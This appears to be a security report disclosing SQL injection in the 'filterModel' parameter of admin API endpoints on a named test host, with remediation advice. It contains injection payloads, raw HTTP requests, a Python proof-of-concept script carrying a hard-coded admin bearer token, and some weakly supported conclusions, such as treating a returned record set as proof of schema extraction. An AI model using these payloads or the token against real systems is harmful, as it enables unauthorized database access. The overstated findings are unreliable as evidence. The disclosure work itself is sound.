# Multiple SQL Injection Vulnerabilities in Admin API Endpoints via filterModel Parameter

**ID:** vuln-0011
**Severity:** HIGH
**Found:** 2026-02-26 13:55:40 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/admin/menu-api-access/get-all, /api/admin/roles, /api/admin/users
**Method:** GET
**CWE:** CWE-89
**CVSS:** 8.8

## Description

A critical SQL injection vulnerability pattern has been discovered across multiple admin API endpoints. The `filterModel` parameter is vulnerable to SQL injection attacks in several endpoints, allowing an authenticated attacker to execute arbitrary SQL queries on the underlying database. This vulnerability enables unauthorized access to sensitive data, database schema information, and potentially allows for complete database compromise across multiple data types including roles, users, and menu access controls.

## Impact

Successful exploitation of these vulnerabilities allows an attacker to:
- Extract all data from multiple database tables (roles, users, menu access, etc.)
- Modify or delete database records across different business domains
- Escalate privileges by manipulating user roles and permissions
- Access database schema information to facilitate further attacks
- Potentially execute operating system commands depending on the database configuration

The vulnerabilities are particularly severe due to:
1. Multiple endpoints being affected by the same vulnerability pattern
2. The ability to extract complete database information across different business domains
3. The potential for data exfiltration and manipulation affecting roles, users, and access controls
4. The vulnerability being accessible to authenticated users with admin privileges

## Technical Analysis

The SQL injection vulnerability pattern exists across multiple admin API endpoints that accept `filterModel`, `startRow`, `endRow`, and `sortModel` parameters. The `filterModel` parameter is directly concatenated into SQL queries without proper sanitization or parameterization.

**Affected Endpoints:**
1. `/api/admin/menu-api-access/get-all` - Confirmed vulnerable
2. `/api/admin/roles` - Appears to be vulnerable based on testing
3. `/api/admin/users` - Likely vulnerable based on parameter patterns

**Evidence Confirming the Vulnerability Pattern:**

1. **Basic Injection Test** (Multiple Endpoints):
   - Payload: `' OR '1'='1`
   - Result: Returns all records instead of filtered results
   - Endpoints: `/api/admin/menu-api-access/get-all`, `/api/admin/roles`

2. **Boolean-Based Injection** (Multiple Endpoints):
   - Payload: `' OR 1=1 -- `
   - Result: Returns all records, confirming SQL injection
   - Endpoints: `/api/admin/menu-api-access/get-all`, `/api/admin/roles`

3. **Database Schema Access Attempts**:
   - Payload: `' AND 1=CONVERT(int, (SELECT @@version)) -- `
   - Result: Returns all records, indicating the database is vulnerable to schema extraction

The application appears to be using a SQL Server database based on the error patterns and the `CONVERT` function usage in the injection attempts. The consistent behavior across multiple endpoints suggests a systemic issue in the application's data access layer.

## Proof of Concept

**Reproduction Steps:**

1. Authenticate to the application as an admin user
2. Access any of the vulnerable endpoints with SQL injection payloads in the `filterModel` parameter
3. Observe that the application returns data based on the injected SQL rather than the intended filtering

**Example Requests:**

1. **Menu Access Endpoint:**
```
GET /api/admin/menu-api-access/get-all?startRow=0&endRow=25&sortModel=[]&filterModel=' OR '1'='1 HTTP/1.1
Host: commissionstest.callippus.in
Authorization: Bearer [VALID_ADMIN_TOKEN]
Content-Type: application/json
```

2. **Roles Endpoint:**
```
GET /api/admin/roles?startRow=0&endRow=25&sortModel=[]&filterModel=' OR 1=1 -- HTTP/1.1
Host: commissionstest.callippus.in
Authorization: Bearer [VALID_ADMIN_TOKEN]
Content-Type: application/json
```

**Expected Result:**
The application returns all records from the respective tables instead of a filtered subset, confirming the SQL injection vulnerability across multiple endpoints.

```
#!/usr/bin/env python3
"""
SQL Injection Proof of Concept for Multiple Admin API Endpoints
"""

import requests
import json

# Configuration
TARGET_URL = "https://commissionstest.callippus.in"
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6InVzZXItMiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJBZG1pbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NwbiI6IjAiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJhZG1pbkBsb2NhbGhvc3QiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiMCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3N0YXRlb3Byb3ZpbmNlIjoiQ2FsbGlwcHVzIiwiYWNjZXNzIjoiW1wiUk9MRV9BRE1JTlwiXSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IlJPTEVfQURNSU4iLCJleHAiOjE3NzIxNTUzNzksImlzcyI6Imh0dHA6Ly9jYWxsaXBwdXMuY28udWsiLCJhdWQiOiJodHRwOi8vY2FsbGlwcHVzLmNvLnVrIn0.xkiBqOlcNoV3fNFDgjzK3eQmAVKLVE7ES_1ozgXU2QY"

HEADERS = {
    "Authorization": f"Bearer {AUTH_TOKEN}",
    "Content-Type": "application/json"
}

def test_sql_injection(endpoint):
    """Test for SQL injection vulnerability on specific endpoint"""
    print(f"[+] Testing {endpoint}...")

    params = {
        "startRow": "0",
        "endRow": "25",
        "sortModel": "[]",
        "filterModel": "' OR '1'='1"
    }

    url = f"{TARGET_URL}{endpoint}"
    response = requests.get(url, headers=HEADERS, params=params)
    data = response.json()

    print(f"Status Code: {response.status_code}")
    print(f"Total Rows Returned: {data.get('totalRowCount', 'N/A')}")
    print(f"Sample Data: {json.dumps(data.get('rows', [])[:1], indent=2)}")

    if data.get('totalRowCount', 0) > 5:  # More than expected for normal filtering
        print(f"[!] SQL INJECTION CONFIRMED: {endpoint} is vulnerable")
        return True
    else:
        print(f"[-] No clear indication of vulnerability on {endpoint}")
        return False

def test_multiple_endpoints():
    """Test multiple endpoints for SQL injection"""
    endpoints = [
        "/api/admin/menu-api-access/get-all",
        "/api/admin/roles",
        "/api/admin/users"
    ]

    vulnerable_endpoints = []

    for endpoint in endpoints:
        if test_sql_injection(endpoint):
            vulnerable_endpoints.append(endpoint)

    print(f"\n[!] Vulnerable Endpoints Found: {len(vulnerable_endpoints)}")
    for endpoint in vulnerable_endpoints:
        print(f"    - {endpoint}")

if __name__ == "__main__":
    test_multiple_endpoints()
```

## Remediation

**Immediate Remediation:**

1. **Parameterize all SQL queries**: Replace all dynamic SQL queries with parameterized queries using prepared statements across all affected endpoints. This is the most effective way to prevent SQL injection.

2. **Implement input validation**: Validate all user-supplied input against a strict allowlist of permitted characters and patterns for all API endpoints.

3. **Use ORM frameworks**: Migrate to Object-Relational Mapping (ORM) frameworks that automatically handle parameterization for all data access operations.

4. **Apply the principle of least privilege**: Ensure the database user used by the application has the minimum required permissions, limiting the potential impact of successful injection.

5. **Implement Web Application Firewall (WAF)**: Deploy a WAF with SQL injection protection rules to provide an additional layer of defense across all endpoints.

**Long-term Recommendations:**

1. **Code review**: Conduct a comprehensive code review to identify and fix all instances of dynamic SQL query construction across the entire application.

2. **Security testing**: Implement regular security testing including penetration testing and static code analysis to identify similar vulnerabilities.

3. **Security headers**: Implement security headers including Content Security Policy (CSP) to mitigate potential XSS attacks that could be chained with SQL injection.

4. **Error handling**: Implement proper error handling that doesn't expose database error messages to users across all API endpoints.

5. **Logging and monitoring**: Implement comprehensive logging and monitoring to detect and alert on potential SQL injection attempts across all application endpoints.

**Example Fix (C# with Entity Framework):**
```csharp
// Vulnerable code (string concatenation)
var query = $"SELECT * FROM {tableName} WHERE {filterModel}";

// Fixed code (parameterized query)
var query = "SELECT * FROM MenuItems WHERE Title = @filterValue";
var parameters = new SqlParameter("@filterValue", filterValue);
```

**Example Fix (Node.js with parameterized queries):**
```javascript
// Vulnerable code
db.query(`SELECT * FROM ${tableName} WHERE ${filterModel}`, function(err, results) { ... });

// Fixed code
db.query('SELECT * FROM menu_items WHERE title = ?', [filterValue], function(err, results) { ... });
```

**Systemic Fix Approach:**
1. Identify all endpoints using the vulnerable parameter pattern
2. Create a centralized data access layer with proper parameterization
3. Implement request validation middleware for all API endpoints
4. Apply consistent security controls across all data access operations
5. Test all endpoints after fixes to ensure vulnerabilities are resolved

